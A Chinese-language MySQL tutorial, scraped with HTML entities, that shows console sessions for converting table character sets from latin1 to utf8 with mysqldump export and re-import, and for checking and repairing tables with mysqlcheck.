Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+----------+-----------------------------------------------------------------+| book&#xA0;&#xA0;&#xA0;&#xA0; | CREATE DATABASE `book` /*!40100 DEFAULT CHARACTER SET latin1 */ |+----------+-----------------------------------------------------------------+1 row in set (0.01 sec) &#x4FEE;&#x6539;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x96C6; 1234567891011121314151617181920212223242526272829mysql&gt; show create table book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (&#xA0; `bTypeId` int(11) DEFAULT NULL,&#xA0; `bName` char(16) DEFAULT NULL,&#xA0; `price` int(11) DEFAULT NULL,&#xA0; `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) mysql&gt; alter table book1 default character set latin1;Query OK, 0 rows affected (0.00 sec)Records: 0&#xA0; Duplicates: 0&#xA0; Warnings: 0 mysql&gt; show create table book1;+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (&#xA0; `bTypeId` int(11) DEFAULT NULL,&#xA0; `bName` char(16) CHARACTER SET utf8 DEFAULT NULL,&#xA0; `price` int(11) DEFAULT NULL,&#xA0; `publishing` char(16) CHARACTER SET utf8 DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=latin1 |+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) &#x6DF1;&#x5165;&#x7814;&#x7A76;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586mysql&gt; drop table book1;Query OK, 0 rows affected (0.00 sec)mysql&gt;&#xA0;CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set latin1;Query OK, 0 rows affected (0.01 sec) mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);ERROR 1366 (HY000): Incorrect string value: &apos;\\xE3\\x80\\x8ALin...&apos; for column &apos;bName&apos; at row 1mysql&gt; drop table book1;Query OK, 0 rows affected (0.00 sec) mysql&gt;&#xA0; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));Query OK, 0 rows affected (0.00 sec) mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);ERROR 1366 (HY000): Incorrect string value: &apos;\\xE3\\x80\\x8ALin...&apos; for column &apos;bName&apos; at row 1mysql&gt; show create table book1;+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (&#xA0; `bTypeId` int(11) DEFAULT NULL,&#xA0; `bName` char(16) DEFAULT NULL,&#xA0; `price` int(11) DEFAULT NULL,&#xA0; `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=latin1 |+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) mysql&gt; drop table book1;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Query OK, 0 rows affected (0.01 sec) mysql&gt;&#xA0; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set utf8;Query OK, 0 rows affected (0.01 sec) mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);Query OK, 1 row affected (0.00 sec) mysql&gt; select * from book1;+---------+-------------------------------+-------+-----------------------+| bTypeId | bName&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price | publishing&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+---------+-------------------------------+-------+-----------------------+|&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0; 66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+---------+-------------------------------+-------+-----------------------+1 row in set (0.00 sec)mysql&gt; show tables;+-----------------------+| Tables_in_testbookdb2 |+-----------------------+| book1 |+-----------------------+1 row in set (0.00 sec)mysql&gt; CREATE TABLE book2 (bTypeId int,bName char(16),price int,publishing char(16)) character set utf8 COLLATE utf8_general_ci;Query OK, 0 rows affected (0.01 sec)mysql&gt; INSERT INTO book2(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; show create table book2;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book2 | CREATE TABLE `book2` ( `bTypeId` int(11) DEFAULT NULL, `bName` char(16) DEFAULT NULL, `price` int(11) DEFAULT NULL, `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; show create table book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` ( `bTypeId` int(11) DEFAULT NULL, `bName` char(16) CHARACTER SET latin1 DEFAULT NULL, `price` int(11) DEFAULT NULL, `publishing` char(16) CHARACTER SET latin1 DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.01 sec)mysql&gt; 1&#xFF09;&#xFF1A;&#x5BFC;&#x51FA;&#x8868;&#x7ED3;&#x6784; mysqldump -uroot -pJaking@vip.163.com --default-character-set=latin1 -d testbookdb &gt; booktable.sql 2&#xFF09;: &#x7F16;&#x8F91;booktable.sql &#x5C06;latin1&#x4FEE;&#x6539;&#x6210;utf8 vim booktable.sql &#x4FEE;&#x6539;&#x6240;&#x6709;latin1&#x4E3A;utf8 3&#xFF09;: &#x786E;&#x4FDD;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x518D;&#x66F4;&#x65B0;&#xFF0C;&#x5BFC;&#x51FA;&#x6307;&#x5B9A;&#x5E93;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;123456789101112131415161718192021mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 --databases testbookdb &gt; bookdata.sqlmysqldump -uroot -pJaking@vip.163.com --databases testbookdb &gt; bookdata.sql mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -B testbookdb &gt; bookdata.sqlmysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -t testbookdb &gt; bookdata.sqlmysqldump -uroot -pJaking@vip.163.com --databases testbookdb &gt; bookdata.sqlmysqldump -uroot -pJaking@vip.163.com -t testbookdb &gt; bookdata.sqlmysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -A &gt; ALL.sqlmysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert -A &gt; ALL.sql mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=utf8 --all-databases &gt; ALL.sqlmysqldump -uroot -pJaking@vip.163.com --all-databases &gt; ALL.sqlmysql -uroot -pJaking@vip.163.com &lt; ALL.sql &#x53C2;&#x6570;&#x8BF4;&#x660E;&#xFF1A;--quick:&#x7528;&#x4E8E;&#x8F6C;&#x50A8;&#x5927;&#x7684;&#x8868;&#xFF0C;&#x5F3A;&#x5236;mysqldump&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x6B21;&#x4E00;&#x884C;&#x7684;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x800C;&#x4E0D;&#x662F;&#x68C0;&#x7D22;&#x6240;&#x6709;&#x884C;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x5F53;&#x524D;cache&#x5230;&#x5185;&#x5B58;&#x4E2D;--no-create-info:&#x4E0D;&#x8981;&#x521B;&#x5EFA;create table&#x8BED;&#x53E5;--extended-insert:&#x4F7F;&#x7528;&#x5305;&#x62EC;&#x51E0;&#x4E2A;values&#x5217;&#x8868;&#x7684;&#x591A;&#x884C;insert&#x8BED;&#x6CD5;&#xFF0C;&#x8FD9;&#x6837;&#x6587;&#x4EF6;&#x66F4;&#x5C0F;&#xFF0C;IO&#x4E5F;&#x5C0F;&#xFF0C;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x65F6;&#x4F1A;&#x975E;&#x5E38;&#x5FEB;--default-character-set=latin1:&#x6309;&#x7167;&#x539F;&#x6709;&#x5B57;&#x7B26;&#x96C6;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x6837;&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x4E2D;&#x6587;&#x90FD;&#x662F;&#x53EF;&#x89C1;&#x7684;&#xFF0C;&#x4E0D;&#x4F1A;&#x4FDD;&#x5B58;&#x6210;&#x4E71;&#x7801;4&#xFF09;&#xFF1A;&#x6253;&#x5F00;bookdata.sql &#x5C06;SET NAME latin1 &#x4FEE;&#x6539;&#x6210;SET NAME utf8 vim bookdata.sql /*!40101 SET NAMES utf8 */; 5&#xFF09;: &#x91CD;&#x65B0;&#x5EFA;&#x5E93;1mysql&gt; create database testdb default charset utf8; 6&#xFF09;&#xFF1A;&#x5EFA;&#x7ACB;&#x8868;&#xFF0C;&#x5BFC;&#x5165;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5BFC;&#x51FA;&#x7684;&#x8868;&#x7684;&#x8868;&#x7ED3;&#x6784;1mysql -uroot -pJaking@vip.163.com testdb &lt; booktable.sql 7&#xFF09;: &#x5BFC;&#x5165;&#x6570;&#x636E; mysql -uroot -pJaking@vip.163.com testdb &lt; bookdata.sql &#x6CE8;&#x610F;&#xFF1A;&#x9009;&#x62E9;&#x76EE;&#x6807;&#x5B57;&#x7B26;&#x96C6;&#x65F6;&#xFF0C;&#x8981;&#x6CE8;&#x610F;&#x6700;&#x597D;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x539F;&#x5B57;&#x7B26;&#x96C6;&#xFF08;&#x5B57;&#x5E93;&#x66F4;&#x5927;&#xFF09;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x4E22;&#x5931;&#x4E0D;&#x88AB;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E; &#x4E8C;&#xFF1A;MySQL&#x65E5;&#x5E38;&#x7EF4;&#x62A4; 1&#xFF1A;mysqlcheck mysql&#x4FEE;&#x590D;&#x5DE5;&#x5177; mysqlcheck&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x590D;MyISAM&#x8868;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F18;&#x5316;&#x548C;&#x5206;&#x6790;&#x8868;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5B83;&#x96C6;&#x6210;&#x4E86;mysql&#x5DE5;&#x5177;&#x4E2D;check&#x3001;repair&#x3001;analyze&#x3001;tmpimize&#x7684;&#x529F;&#x80FD;&#x3002;/usr/local/mysql/bin/mysqlcheck #&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;&#x4F4D;&#x7F6E; 123456789101112131415rpm -qf `which mysqlcheck` &#xA0;yum&#x5B89;&#x88C5;&#x67E5;&#x770B;[root@jaking ~]# rpm -qf `which mysqlcheck`file /usr/local/mysql57/bin/mysqlcheck is not owned by any package[root@jaking ~]# yum provides mysqlcheckLoaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.1:mariadb-5.5.52-1.el7.x86_64 : A community developed branch of MySQLRepo&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; : rhel7Matched from:Filename&#xA0;&#xA0;&#xA0; : /usr/bin/mysqlcheck[root@jaking ~]# yum install -y mariadb-5.5.52-1.el7.x86_64[root@jaking ~]# rpm -qf `which mysqlcheck`mariadb-5.5.52-1.el7.x86_64[root@jaking ~]# which mysqlcheck/usr/bin/mysqlcheck &#x53C2;&#x6570;&#x9009;&#x9879;&#xFF1A;mysqlcheck &#x2013;help &#x67E5;&#x770B;&#x5E2E;&#x52A9;-c, &#x2013;check (&#x68C0;&#x67E5;&#x8868;)&#xFF1B;-r, &#x2013;repair&#xFF08;&#x4FEE;&#x590D;&#x8868;)&#xFF1B;-a, &#x2013;analyze (&#x5206;&#x6790;&#x8868;)&#xFF1B;-o, &#x2013;tmpimize(&#x4F18;&#x5316;&#x8868;)&#xFF1B; //&#x5176;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x9009;&#x9879;&#x662F;-c(&#x68C0;&#x67E5;&#x8868;)-u&#xFF0C; &#x4F7F;&#x7528;mysql&#x4E2D;&#x54EA;&#x4E2A;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x64CD;&#x4F5C; mysqlcheck&#x4F7F;&#x7528;&#x8BED;&#x6CD5;&#xFF1A;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;3&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x8C03;&#x7528;mysqlcheck&#xFF1A;mysqlcheck[tmpions] db_name [tables]mysqlcheck[tmpions] &#x2014;database DB1 [DB2 DB3&#x2026;]mysqlcheck[tmpions] &#x2013;all&#x2013;databases&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x4EFB;&#x4F55;&#x8868;&#x6216;&#x4F7F;&#x7528;&#x2014;databases(-B)&#x6216;&#x2013;all&#x2013;databases(-A)&#x9009;&#x9879;&#xFF0C;&#x5219;&#x68C0;&#x67E5;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x3002; &#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF1A; 1&#xFF1A;&#x68C0;&#x67E5;&#x8868;(check)123[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -c testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1 OK 2: &#x4FEE;&#x590D;&#x8868;&#xFF08;repair&#xFF09;123456789101112131415161718[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1note : The storage engine for the table doesn&apos;t support repair[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.&#xA0; Commands end with ; or \\g.Your MySQL connection id is 12Server version: 5.7.19 Source distribution Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 12345678910111213141516171819202122232425262728293031mysql&gt; show create table testdb.book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (&#xA0; `bTypeId` int(11) DEFAULT NULL,&#xA0;&#xA0;`bName` char(16) DEFAULT NULL,&#xA0; `price` int(11) DEFAULT NULL,&#xA0; `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) mysql&gt; alter table testdb.book1 engine = MyISAM;Query OK, 0 rows affected (0.00 sec)Records: 0&#xA0; Duplicates: 0&#xA0; Warnings: 0 mysql&gt; show create table testdb.book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table 